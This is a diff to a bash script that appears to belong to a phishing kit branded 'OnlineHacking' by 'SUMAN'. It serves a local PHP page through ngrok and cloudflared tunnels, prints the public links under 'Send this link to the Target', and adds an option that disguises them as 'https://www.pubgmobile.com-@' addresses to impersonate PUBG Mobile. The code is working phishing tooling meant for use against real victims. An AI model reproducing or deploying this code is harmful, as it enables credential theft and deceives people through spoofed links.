@@ -58,21 +58,41 @@ echo ""
                            sleep 3
 			   echo ""
 			   ./ngrok http 4444 > /dev/null 2>&1 &
-			   nlink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
 			   
-   echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://127.0.0.1:4444 ${GREEN})"
+			   
+			   
+			   echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://127.0.0.1:4444 ${GREEN})"
 	{ sleep 1; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
 
     if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./cloudflared tunnel -url 127.0.0.1:4444 --logfile cld.log > /dev/null 2>&1 &
+        sleep 2 && termux-chroot ./ngrok http 127.0.0.1:4444 > /dev/null 2>&1 & 
     else
-        sleep 2 && ./cloudflared tunnel -url 127.0.0.1:4444 --logfile cld.log > /dev/null 2>&1 &
+        sleep 2 && ./ngrok http 127.0.0.1:4444 > /dev/null 2>&1 &
     fi
 
-	{ sleep 8; clear; }
+	{ sleep 8; clear; banner_small; }
+	nlink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+			   
+			   
+			   
+			   
+			   
+		
+			   
+                           echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://127.0.0.1:4444 ${GREEN})"
+				{ sleep 1; }
+				echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
+
+   				 if [[ `command -v termux-chroot` ]]; then
+				sleep 2 && termux-chroot ./cloudflared tunnel -url 127.0.0.1:4444 --logfile cld.log > /dev/null 2>&1 &
+   			 else
+     		              sleep 2 && ./cloudflared tunnel -url 127.0.0.1:4444 --logfile cld.log > /dev/null 2>&1 &
+   				 fi
+
+				{ sleep 8; clear; }
 	
-	clink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cld.log")
+				clink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cld.log")
 			   
 			   
 			   echo ""
@@ -108,13 +128,16 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n
 			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m=========================\e[92m"
                            echo ""
                            echo ""
-			   echo ""
+			   echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;36m Send this link to the Target "
 			   echo ""
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $clink                                   
+                           printf "\e[1;33m\e[0m\e[1;33m Cloudflared Link :\e[0m\e[1;77m %s\e[0m\n" $clink                                   
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
-                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$nlink
+                           printf "\e[1;33m\e[0m\e[1;33m Ngrok Link :\e[0m\e[1;77m %s\e[0m\n" https://$nlink
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+			   echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m Localhost Link :\e[0m\e[1;77m %s\e[0m\n" http://127.0.0.1:4444
                            echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
 			   echo ""
 			   rm -rf cld.log
@@ -160,10 +183,28 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n
 			   echo -e $" [\e[92m*\e[91m]\e[1;93m PHP Server Now Startng ... \e[0m  "
                            echo ""
 			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+			   ./ngrok http 4444 > /dev/null 2>&1 &
+			   nlink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+			   
+                           echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://127.0.0.1:4444 ${GREEN})"
+				{ sleep 1; }
+				echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
+
+   				 if [[ `command -v termux-chroot` ]]; then
+				sleep 2 && termux-chroot ./cloudflared tunnel -url 127.0.0.1:4444 --logfile cld.log > /dev/null 2>&1 &
+   			 else
+     		              sleep 2 && ./cloudflared tunnel -url 127.0.0.1:4444 --logfile cld.log > /dev/null 2>&1 &
+   				 fi
+
+				{ sleep 8; clear; }
+	
+				clink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cld.log")
+			   
                            sleep 3
 			   echo ""
                            echo ""
                            echo ""
+			   clear
 echo -e "\e[92m
 SUMAN ©\e[34m
          ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
@@ -193,9 +234,25 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n
 			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m=========================\e[92m"
                            echo ""
                            echo ""
+                           echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;36m Send this link to the Target "
 			   echo ""
-                           echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;36m Share Ngrok Link and Using "
+			   echo "" 
+                           read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
+                           echo ""
+                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
+                           then
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m Cloudflared Link :\e[0m\e[1;77m %s\e[0m\n" https://www.pubgmobile.com-@$clink
+			   printf "\e[1;33m\e[0m\e[1;33m Ngrok Link :\e[0m\e[1;77m %s\e[0m\n" https://www.pubgmobile.com-@$nlink
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           else
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m Cloudflared Link :\e[0m\e[1;77m %s\e[0m\n" https://$clink
+			   printf "\e[1;33m\e[0m\e[1;33m Ngrok Link :\e[0m\e[1;77m %s\e[0m\n" https://$nclink
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           fi
 			   echo ""
+			   rm -rf cld.log
                            
                            if [[ -e OnlineHacking.txt ]]; then
                            > OnlineHacking.txt
